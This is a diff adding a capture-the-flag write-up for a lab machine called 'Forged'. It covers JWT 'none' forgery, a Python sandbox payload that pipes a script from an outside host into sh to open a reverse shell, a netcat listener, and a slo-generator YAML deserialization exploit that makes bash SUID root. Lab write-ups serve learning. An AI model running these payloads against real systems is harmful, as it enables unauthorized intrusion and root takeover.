@@ -1,0 +1,119 @@
+---
+title: 'Forged Writeup'
+date: '2025-02-15'
+tags: ['RCE', 'Linux', 'Hacking Club']
+draft: false
+summary: 'The application is vulnerable to JWT token forgery, remote code execution (RCE), and privilege escalation via slo-generator.'
+images: ['/static/images/forged-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/forged-writeup-images/default.png)
+
+---
+
+## Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+![forged](/static/images/forged-writeup-images/image.png)
+
+---
+
+## Enumeration
+
+`http://172.16.8.48`
+
+![forged 1](/static/images/forged-writeup-images/image1.png)
+
+![forged 2](/static/images/forged-writeup-images/image2.png)
+
+After registering, we can see the application has a **New Project** feature. However, we don’t have the privilege to access it.
+
+![forged 3](/static/images/forged-writeup-images/image3.png)
+
+![forged 4](/static/images/forged-writeup-images/image4.png)
+
+Looking at the session cookies, we can see it uses a JWT.
+
+![forged 5](/static/images/forged-writeup-images/image5.png)
+
+https://jwt.io/
+
+![forged 6](/static/images/forged-writeup-images/image6.png)
+
+With this, we can test some JWT-related attacks.
+
+### JWT Hunter
+
+Using the tool Jwt Hunter, we can see the JWT is vulnerable to a **None Attack**.
+
+https://jwthunter.io/
+
+![forged 7](/static/images/forged-writeup-images/image7.png)
+
+After copying the payload and pasting it into the session cookies, we gain access to the feature.
+
+![forged 8](/static/images/forged-writeup-images/image8.png)
+
+---
+
+## Foot Hold
+
+The **New Project** feature is a Python sandbox, and we gain initial access by sending the following payload:
+
+`evil.py`
+
+```python
+__import__('os').popen("curl 10.0.31.150/sh | sh").read()
+```
+
+![forged 9](/static/images/forged-writeup-images/image9.png)
+
+Note: I used the payload from https://reverse-shell.sh/yourip:1337
+
+```bash
+python3 -m http.server 80
+```
+
+![forged 10](/static/images/forged-writeup-images/image10.png)
+
+```bash
+nc -lnvp 1337
+```
+
+![forged 11](/static/images/forged-writeup-images/image11.png)
+
+---
+
+## Privillege Escalation
+
+```bash
+sudo -l
+```
+
+![forged 12](/static/images/forged-writeup-images/image12.png)
+
+We can run the `slo-generator` binary as root without a password.
+
+After some research, we found there’s a known exploit.
+
+https://www.exploit-db.com/exploits/50385
+
+![forged 13](/static/images/forged-writeup-images/image13.png)
+
+To exploit it, just run the following commands:
+
+```python
+echo '!!python/object/apply:os.system ["chmod u+s /bin/bash"]' > exploit.yaml
+sudo /usr/local/bin/slo-generator migrate -b exploit.yaml
+bash -p
+```
+
+![forged 14](/static/images/forged-writeup-images/image14.png)
+
+---
+
+## Proof
+
+![forged 15](/static/images/forged-writeup-images/image15.png)
